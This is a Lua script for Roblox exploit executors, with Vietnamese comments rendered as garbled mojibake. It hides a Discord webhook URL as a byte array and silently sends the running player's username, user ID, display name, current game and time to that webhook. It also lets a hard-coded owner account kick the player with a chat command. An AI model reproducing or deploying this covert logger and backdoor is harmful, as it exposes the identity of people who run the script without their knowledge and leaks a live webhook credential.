-- H√†m gi·∫£i m√£ chu·ªói t·ª´ bytecode
local function decodeString(data)
    local str = ""
    for i = 1, #data do
        str = str .. string.char(data[i])
    end
    return str
end

-- Webhook ƒë∆∞·ª£c m√£ h√≥a b·∫±ng bytecode
local webhook = decodeString({
    104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 
    99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 
    47, 49, 51, 53, 52, 52, 48, 52, 54, 57, 56, 55, 54, 53, 49, 51, 53, 57, 57, 
    53, 47, 57, 100, 95, 90, 119, 100, 52, 83, 89, 105, 51, 53, 70, 51, 97, 74, 
    71, 68, 119, 116, 82, 68, 102, 73, 68, 95, 76, 74, 119, 107, 57, 116, 105, 
    101, 65, 107, 72, 122, 109, 89, 73, 108, 116, 55, 55, 76, 65, 90, 122, 55, 
    52, 98, 105, 81, 103, 76, 90, 119, 103, 106, 73, 77, 119, 115, 90, 73, 100, 
    107
})

local request = (syn and syn.request) or (http and http.request) or http_request
local player = game:GetService("Players").LocalPlayer
local httpService = game:GetService("HttpService")

-- L·∫•y th√¥ng tin game
local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local gameName = gameInfo.Name
local gameLink = "https://www.roblox.com/games/" .. game.PlaceId

-- L·∫•y th·ªùi gian hi·ªán t·∫°i
local timeExecuted = os.date("%Y-%m-%d %H:%M:%S", os.time())

-- Link GIF t·ª´ Discord CDN
local gifURL = "https://cdn.discordapp.com/attachments/1245207779153805384/1354409898032500857/image0.gif"

-- D·ªØ li·ªáu g·ª≠i
local data = {
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "üìå **Th√¥ng Tin Ng∆∞·ªùi Ch∆°i**",
        ["color"] = 16711680, -- M√†u ƒë·ªè
        ["fields"] = {
            { ["name"] = "üë§ Username | User ID", ["value"] = player.Name .. " | " .. player.UserId, ["inline"] = false },
            { ["name"] = "üì± Game Name", ["value"] = gameName .. " [(Truy c·∫≠p game)](" .. gameLink .. ")", ["inline"] = false },
            { ["name"] = "üìë Display Name", ["value"] = player.DisplayName, ["inline"] = false },
            { ["name"] = "‚åö Time", ["value"] = timeExecuted, ["inline"] = false },
            { ["name"] = "üìù Ghi ch√∫", ["value"] = "Ch·ªâ c√≥ ng∆∞·ªùi d√πng c√≥ quy·ªÅn m·ªõi c√≥ th·ªÉ kick ng∆∞·ªùi ch∆°i", ["inline"] = false }
        },
        ["thumbnail"] = { ["url"] = gifURL } -- GIF nh·ªè b√™n g√≥c ph·∫£i embed
    }}
}

-- G·ª≠i d·ªØ li·ªáu qua webhook
request({
    Url = webhook,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = httpService:JSONEncode(data)
})



local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer

-- Ch·ªß s·ªü h·ªØu script
local ownerId = 4882845089
local ownerUsername = "konmeo22132"

-- L·∫Øng nghe tin nh·∫Øn t·ª´ ng∆∞·ªùi kh√°c
Players.PlayerChatted:Connect(function(player, message)
    -- Ch·ªâ x·ª≠ l√Ω n·∫øu ng∆∞·ªùi g·ª≠i l√† ch·ªß
    if player.UserId ~= ownerId and player.Name ~= ownerUsername then return end

    -- Ki·ªÉm tra !kick
    local lowerMsg = message:lower()
    local cmd, target, reason = lowerMsg:match("^!(%w+)%s+(%S+)%s*(.*)$")
    
    if cmd == "kick" then
        reason = reason or ""

        for _, otherPlayer in pairs(Players:GetPlayers()) do
            -- N·∫øu m·ª•c ti√™u l√† ng∆∞·ªùi d√πng n√†y
            if otherPlayer == LocalPlayer then
                if tostring(LocalPlayer.UserId) == target or LocalPlayer.Name:lower() == target:lower() then
                    local kickMessage = "B·∫°n ƒë√£ b·ªã kick"
                    if reason ~= "" then
                        kickMessage = kickMessage .. " | L√Ω do: " .. reason
                    end
                    LocalPlayer:Kick(kickMessage)
                end
            end
        end
    end
end)
